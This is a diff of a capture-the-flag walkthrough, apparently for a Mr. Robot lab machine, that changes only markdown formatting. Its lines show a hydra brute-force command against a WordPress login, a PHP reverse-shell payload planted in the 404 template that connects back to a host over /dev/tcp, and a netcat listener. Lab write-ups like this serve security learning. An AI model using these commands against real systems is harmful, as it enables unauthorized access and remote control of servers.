@@ -42,8 +42,8 @@ Used command ``` sudo hydra -vv -l Elliot -P  ufsocity.txt 192.168.1.8 http-pos
 ## Reverse Shell
 After successfully logged into the website then I navigated to Appearance > Editor and selected the 404 Template since its easy to trigger. 
 ### Payload used 
-    ```<?php
+    <?php
       exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
-    ?>```
+    ?>
 ### Netcat listener
  ```nc -lvp 443 ```
